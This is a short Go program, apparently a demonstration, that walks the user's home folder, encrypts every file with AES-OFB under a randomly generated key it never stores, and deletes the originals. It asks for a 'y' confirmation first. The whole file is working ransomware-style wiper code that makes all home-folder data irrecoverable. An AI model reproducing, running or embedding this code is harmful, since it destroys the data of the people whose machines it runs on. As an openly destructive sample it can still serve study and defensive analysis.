package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"io/fs"
	"log"
	"os"
	"os/user"
	"path/filepath"
)

func main() {
	log.Println("Running this program will irrecoverably encrypt all files in your home folder")
	log.Println("Are you sure you want to proceed? y/N")

	answer := "n"

	_, err := fmt.Scanf("%s", &answer)
	if err != nil {
		log.Fatal(err)
	}

	if answer != "y" {
		log.Fatal("Exiting")
	}

	self, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}

	// Create aes encryption key
	key := make([]byte, 32)
	_, err = rand.Read(key)
	if err != nil {
		log.Fatal("failed to create encryption key")
	}

	err = filepath.WalkDir(self.HomeDir, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}

		if d.IsDir() {
			return nil
		}

		err = encrypt(path, key)
		if err != nil {
			return err
		}

		return os.Remove(path)
	})
	if err != nil {
		log.Fatal(err)
	}
}

// Encrypt file in ofb mode
func encrypt(path string, key []byte) error {
	plain, err := os.Open(path)
	if err != nil {
		return err
	}

	enc, err := os.Create(path + ".encrypted")
	if err != nil {
		return err
	}
	defer enc.Close()

	iv := make([]byte, aes.BlockSize)

	_, err = rand.Read(iv)
	if err != nil {
		return err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	stream := cipher.NewOFB(block, iv)
	w := cipher.StreamWriter{S: stream, W: enc}

	_, err = io.Copy(w, plain)
	if err != nil {
		return err
	}

	return nil
}
